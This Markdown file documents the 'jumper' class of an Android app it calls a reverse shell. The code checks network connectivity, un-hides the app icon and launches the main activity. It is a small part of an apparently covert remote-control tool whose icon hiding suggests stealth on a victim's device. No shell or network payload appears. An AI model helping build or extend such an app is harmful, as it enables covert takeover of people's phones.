# Jumper Class for Reverse Shell Android Application

This Markdown file describes the `jumper` class used in the Reverse Shell Android application. The `jumper` class is responsible for handling the initialization process and starting the main activity of the application.

## Class Overview

The `jumper` class provides methods to initialize the application and start the main activity. It checks for network connectivity and launches the main activity if a network connection is available.

## Code Explanation

```java
package com.example.reverseshell2;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class jumper {
    Context context;

    public jumper(Context context) {
        this.context = context;
    }

    public void init() {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnected()) {
            new functions(null).unHideAppIcon(context);
            Intent a = new Intent(context, MainActivity.class);
            a.addFlags(FLAG_ACTIVITY_NEW_TASK);
            a.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
            context.startActivity(a);
        }
    }
}
```

- The `jumper` class takes a `Context` object as a parameter in the constructor.
- The `init()` method is responsible for initializing the application and starting the main activity.
  - The `ConnectivityManager` is used to check for network connectivity.
  - If a network connection is available (`cm.getActiveNetworkInfo() != null` and `cm.getActiveNetworkInfo().isConnected()`), the following steps are executed:
    - The application icon is unhidden using the `unHideAppIcon()` method of the `functions` class.
    - An instance of the `MainActivity` class is created and stored in an `Intent` object.
    - The `FLAG_ACTIVITY_NEW_TASK` flag is added to the intent to indicate that a new task should be created for the activity.
    - The `FLAG_ACTIVITY_NO_ANIMATION` flag is added to the intent to indicate that no animation should be used when starting the activity.
    - The main activity is started by calling `context.startActivity(a)`.

## Usage

The `jumper` class is used to handle the initialization process and start the main activity of the Reverse Shell Android application. It checks for network connectivity and launches the main activity if a network connection is available.
